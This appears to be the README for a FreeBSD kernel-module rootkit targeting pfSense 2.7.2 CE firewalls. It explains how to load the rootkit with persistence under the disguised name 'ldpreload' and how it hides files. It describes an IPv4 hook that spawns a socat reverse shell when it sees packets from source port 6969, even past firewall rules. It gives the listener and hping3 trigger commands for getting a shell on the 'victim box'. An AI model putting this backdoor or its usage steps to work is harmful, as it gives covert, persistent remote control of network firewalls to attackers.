First off, I would like to give a massive thank you to my friend Sharad(mineo333) for helping 
create the functionality of forking a process and running kern_execve() in the child.  This is the
core of the entire rootkit and what allows for code execution upon the condition of a packet
with a certain source port being seen.  I could not have done this without his help.

Secondly, the functionality that hides file is completely 1 for 1 ripped from BlueDragonSecurity's(bluedragonsecurity) repo bds_freebsd.  Big thanks for making this. 

An important note, the current .ko files are only usable for pfSense 2.7.2 CE.
You to compile these yourself, you must do it within a pfSense box, NOT a compatable freeBSD kernel.
To be able to compile within pfSense you must follow the steps outlined in "extra/how_to_setup_pfsense_to_compile.txt".

The "extra" directory holds the C code and Makefile to create an LKM that will eternally just print's a face, normal input will still work on the terminal it jsut scrolls really fast, you can also just unload it to make it stop. To load it you must run
kldload /boot/modules/.evil/evil.ko

ldpreload/LD_PRELOAD is a false name used for the rootkit since this LKM does not exist within pfSense but appears normal.

This LKM/Rootkit has persistance, from ldpreload.sh, which is loaded via load_and_setup.sh.

To load the Rootkit you must clone this directroy, cd into it, chmod +x load_and_setup.sh, and run ./load_and_setup.sh.
You will be popped out into a ghost /Apekit-tooshit directory so run cd / after the script is done.

What does it do?
This Rootkit registers a custom hook to the top of the IPv4 head within pfSense and establishes reverse shells by forking the process that runs cat and running the reverse shell command in that fork with execve.
This is super duper mega awesome because even if firewall rules are made against the attacker IP, ports, anything.  The registered hook will still receive the packet and make a reverse shell.
We use socat to make the reverse shell since FreeBSD's native version of nc (netcat) doesn't allow for reverse shells.

To get a reverse shell!

Run "nc -lvnp 7000" on the attaking machine in a terminal.
In another terminal, send packets that will pop open a reverse shell with the command
"sudo hping3 -S -p <destination port> -s 6969 <ip of victim box>"
Once you see the reverse shell connect, run control + c in the terminal that is sending the packets (you do not need to keep sending more traffic).
If the reverse shell doesn't connect after about 5 packets then run control + c in the terminal that is sending packets and re-run the command, packet filtering is finickey and sometimes you need to try a couple times.

